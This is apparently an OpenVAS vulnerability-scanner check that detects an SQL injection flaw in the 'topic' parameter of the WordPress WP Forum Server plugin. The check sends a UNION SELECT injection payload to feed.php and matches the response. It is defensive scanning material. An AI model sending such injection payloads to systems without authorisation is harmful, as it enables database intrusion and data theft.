###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_wp_forum_server_plugin_sql_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# WordPress WP Forum Server 'topic' Parameter SQL Injection Vulnerability
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to perform SQL Injection attack
  and gain sensitive information.
  Impact Level: Application";
tag_affected = "WP Forum Server Wordpress plugin 1.6.5";
tag_insight = "The flaws are caused by improper validation of user-supplied input via the
  'topic' parameter to '/wp-content/plugins/forum-server/feed.php', which
  allows attackers to manipulate SQL queries by injecting arbitrary SQL code.";
tag_solution = "No solution or patch is available as of 09th March, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://wordpress.org/extend/plugins/forum-server/";
tag_summary = "This host is installed with WordPress WP Forum Server plugin and is prone to
  SQL injection vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802006";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-03-10 13:33:28 +0100 (Thu, 10 Mar 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("WordPress WP Forum Server 'topic' Parameter SQL Injection Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/16235/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/98715/");
  script_xref(name : "URL" , value : "http://www.htbridge.ch/advisory/sql_injection_in_wp_forum_server_wordpress_plugin.html");

  script_description(desc);
  script_summary("Check if WordPress is vulnerable to SQL Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("wordpress/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");


## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get WordPress Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

## Construct the Attack Request
url =  dir + "/wp-content/plugins/forum-server/feed.php?topic=" +
             "1%20union%20select%20version%28%29%20--";

## Try attack and check the response to confirm vulnerability.
if(http_vuln_check(port:port, url:url, pattern:"<title>.* Topic:" +
          "  [0-9]+\.[0-9a-zA-Z\.]+ ?</title>", check_header: TRUE))
{
  security_hole(port);
  exit(0);
}
